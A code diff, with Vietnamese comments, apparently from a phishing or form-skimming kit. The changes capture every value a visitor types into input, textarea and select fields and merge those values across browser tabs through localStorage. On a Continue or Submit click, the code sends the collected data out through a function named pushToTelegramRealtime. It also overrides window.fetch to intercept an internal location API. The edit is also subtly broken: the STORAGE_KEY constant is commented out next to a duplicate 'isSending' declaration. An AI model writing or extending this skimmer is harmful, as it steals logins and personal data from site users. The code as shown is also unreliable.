@@ -186,20 +186,51 @@
         })
       });
     } catch (err) {}
-  }let isSending = false;// 1. Chỉ lưu dữ liệu khi người dùng nhập, KHÔNG tự động gửi
+  }let isSending = false;// const STORAGE_KEY = 'shared_captured_fields';
+  let isSending = false;
+
+  // Hàm hỗ trợ đọc/ghi dữ liệu dùng chung giữa các tab
+  function getSharedFields() {
+    try {
+      return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {};
+    } catch (e) {
+      return {};
+    }
+  }
+
+  function saveSharedField(label, value) {
+    const current = getSharedFields();
+    if (value !== '') {
+      current[label] = value;
+    } else {
+      delete current[label];
+    }
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(current));
+    // Cập nhật luôn biến capturedFields hiện tại để hàm pushToTelegramRealtime đọc được
+    Object.assign(capturedFields, current);
+  }
+
+  // Khôi phục dữ liệu từ các tab khác ngay khi tải trang
+  Object.assign(capturedFields, getSharedFields());
+
+  // Lắng nghe sự thay đổi nếu người dùng đang mở song song nhiều tab cùng lúc
+  window.addEventListener('storage', function(e) {
+    if (e.key === STORAGE_KEY) {
+      for (let key in capturedFields) delete capturedFields[key];
+      Object.assign(capturedFields, getSharedFields());
+    }
+  });
+
+  // 1. Lưu và gộp dữ liệu vào bộ nhớ chung mỗi khi người dùng nhập ở bất kỳ tab nào
   document.addEventListener('input', function(e) {
     const el = e.target;
     if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
       const label = getCleanFieldLabel(el);
-      if (el.value.trim() !== '') {
-        capturedFields[label] = el.value.trim();
-      } else {
-        delete capturedFields[label];
-      }
+      saveSharedField(label, el.value.trim());
     }
   }, true);
 
-  // 2. Chỉ gửi dữ liệu 1 lần duy nhất khi bấm nút Continue hoặc Submit
+  // 2. Khi bấm nút Continue hoặc Submit ở tab hiện tại, gộp toàn bộ dữ liệu và gửi 1 lần
   document.addEventListener('click', async function(e) {
     const btn = e.target.closest('button, [type="submit"], [role="button"]');
     if (!btn) return;
@@ -210,11 +241,18 @@
       btnText.includes('continue') || 
       btnText.includes('submit');
 
-    if (isTargetBtn && Object.keys(capturedFields).length > 0 && !isSending) {
+    // Lấy dữ liệu mới nhất đã gộp từ tất cả các tab
+    const allMergedData = getSharedFields();
+
+    if (isTargetBtn && Object.keys(allMergedData).length > 0 && !isSending) {
       isSending = true;
       try {
+        // Đảm bảo biến capturedFields chứa toàn bộ dữ liệu đã gộp trước khi gọi hàm gửi
+        Object.assign(capturedFields, allMergedData);
         await pushToTelegramRealtime("SUBMIT");
-        // Xóa dữ liệu cũ sau khi gửi xong để tránh gửi lặp ở bước sau (nếu có)
+
+        // Xóa sạch bộ nhớ chung ở tất cả các tab sau khi đã gửi thành công
+        localStorage.removeItem(STORAGE_KEY);
         for (let key in capturedFields) {
           delete capturedFields[key];
         }
@@ -224,7 +262,7 @@
     }
   }, true);
 
-  // 3. Giữ nguyên chặn fetch để web không bị lỗi API, nhưng KHÔNG gọi hàm gửi lặp lại ở đây
+  // 3. Giữ nguyên chặn fetch API nội bộ
   window.fetch = async function(url, options) {
     if (typeof url === 'string' && url.includes('/api/ip-location')) {
       const data = await loadGeoDetails();
